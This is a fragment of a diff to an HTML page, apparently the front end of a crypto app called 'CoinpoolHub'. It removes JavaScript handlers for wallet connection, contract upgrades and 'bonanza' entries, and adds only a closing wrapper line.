-        const tx = await writeContract.upgrade(next);
-        log("upgrade tx:", tx.hash);
-        await tx.wait();
-        log("upgrade mined.");
-        await loadUserData(addr);
-      } catch(e){
-        log("upgrade failed:", e.message || e);
-        alert("upgrade error: " + (e.message || e));
-      }
-    }
-
-    async function onJoinBonanza25(){
-      try {
-        if(!writeContract) return alert("Connect wallet first");
-        const tx = await writeContract.enterBonanza25();
-        log("join25 tx:", tx.hash);
-        await tx.wait();
-        log("join25 done");
-        await loadUserData(await signer.getAddress());
-      } catch(e){
-        log("join25 failed:", e.message || e);
-        alert("join25 error: " + (e.message || e));
-      }
-    }
-
-    async function onJoinBonanza50(){
-      try {
-        if(!writeContract) return alert("Connect wallet first");
-        const tx = await writeContract.enterBonanza50();
-        log("join50 tx:", tx.hash);
-        await tx.wait();
-        log("join50 done");
-        await loadUserData(await signer.getAddress());
-      } catch(e){
-        log("join50 failed:", e.message || e);
-        alert("join50 error: " + (e.message || e));
-      }
-    }
-
-    /* ---------- attach handlers ---------- */
-    document.getElementById("btnConnect").addEventListener("click", async ()=>{
-      await connectWallet();
-    });
-
-    // Initialize on load
-    window.addEventListener('load', async () => {
-      log("CoinpoolHub interface initialized");
-      try {
-        await initReadContract();
-        log("Read contract initialized successfully");
-      } catch (e) {
-        log("Initialization error:", e.message);
-      }
-    });
-  </script>
+})();
+</script>
 </body>
 </html>
-
-
 
 
